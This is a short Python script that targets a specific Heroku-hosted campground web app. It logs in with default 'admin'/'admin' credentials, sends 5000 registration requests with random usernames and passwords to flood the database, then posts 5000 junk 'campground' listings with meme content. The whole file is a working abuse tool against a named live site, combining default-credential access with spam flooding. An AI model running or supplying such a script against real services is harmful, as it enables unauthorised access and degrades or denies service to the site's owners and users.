

import requests,string,random

def forumData():
    data = {
        'name': "bruh",
        'price': 69,
        'image': "https://i.ytimg.com/vi/wUAftsmzl9M/maxresdefault.jpg",
        'description': "lol",
    }
    return data
def name():
    return ''.join(random.choice(characters) for i in range(30))
r = requests.Session()

#login
r.post('https://salty-reef-80979.herokuapp.com/login',data={'username':'admin','password':'admin'})

#fill db
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
for i in range(5000):
    requests.get('https://salty-reef-80979.herokuapp.com/register',data={'username': name(),'password': name()})
    
print("Done with users")
#send meme
for i in range(5000):
    x = r.post('https://salty-reef-80979.herokuapp.com/campgrounds',data=forumData())
print("Done")
